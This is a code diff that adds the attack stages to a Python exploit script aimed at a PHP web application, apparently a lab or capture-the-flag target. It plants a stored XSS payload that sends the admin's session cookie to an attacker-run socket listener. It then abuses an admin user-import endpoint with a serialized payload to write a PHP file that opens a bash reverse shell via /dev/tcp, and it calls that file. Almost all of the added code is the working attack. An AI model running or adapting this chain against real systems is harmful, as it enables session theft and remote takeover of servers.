@@ -1,6 +1,12 @@
+import base64
+import socket
+import sys
 import requests
 import string
 import json
+import random
+import subprocess
+import time
 
 MAX_USERNAME_LENGTH = 30
 ALPHANUM = string.ascii_letters + string.digits + '_'
@@ -66,6 +72,65 @@ def get_token(username):
     print(f"Token discovered: {token}")
     return token
 
+def set_desc(session, d):
+	d = {"description":d}
+	r = session.post(URL + '/profile.php',data=d)
+	return "Success" in r.text
+
+def get_admin_session(host, lport, session):
+
+    if set_desc(session, "<script>document.write('<img src=http://%s:%d/'+document.cookie+' />');</script>"%(host,lport)):
+        print("[+] XSS payload set successfully.")
+    else:
+        print("[-] Failed to set XSS payload.")
+        return
+
+    print("[*] Setting up listener on port %d..."%lport)
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((host,lport))
+    s.listen()
+
+    print("[*] Waiting for admin to trigger XSS...")
+    (sock_c, ip_c) = s.accept()
+    get_request = sock_c.recv(4096)
+    admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")
+
+    print("[+] Stole admin's cookie:")
+    print("    -- " + admin_cookie) 
+    return admin_cookie
+
+def import_user(cookie, payload, target):
+	c = {"PHPSESSID":cookie}
+	d = {"userobj":payload}
+	r = requests.post("%s/admin/import_user.php"%URL,data=d,cookies=c)
+
+def code_injection(host, lport, session, cookie):
+    evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+
+    f = "/var/www/html/%s.php"%evil
+    c = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\"); ?>"%(host,lport)
+    c = base64.urlsafe_b64encode(c.encode("UTF-8")).decode("UTF-8")
+
+    proc = subprocess.Popen(["python", "serialize.py", f, c], stdout=subprocess.PIPE)
+    payload = proc.stdout.read()
+    print("[+] Generated payload!")
+
+    import_user(cookie, payload, host)
+    print("[*] Sent import user request (%s.php)"%(evil))
+
+    print("[*] Attempting to start reverse shell...")
+    subprocess.Popen([
+        "powershell",
+        "-Command",
+        f"$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, {lport}); $listener.Start(); $client = $listener.AcceptTcpClient();"
+    ])
+    time.sleep(1)
+    requests.get("%s/%s.php"%(URL,evil))
+
+    while True:
+        pass
+
 if __name__ == "__main__":
 
     file_path = "values.json"
@@ -89,4 +154,7 @@ if __name__ == "__main__":
         print("Login failed")
     else:
         print("Logged in!")
+        admin_cookie = get_admin_session("localhost", 8082, session)
+        code_injection("localhost", 8083, session, admin_cookie)
         #TODO: get admin account
+       
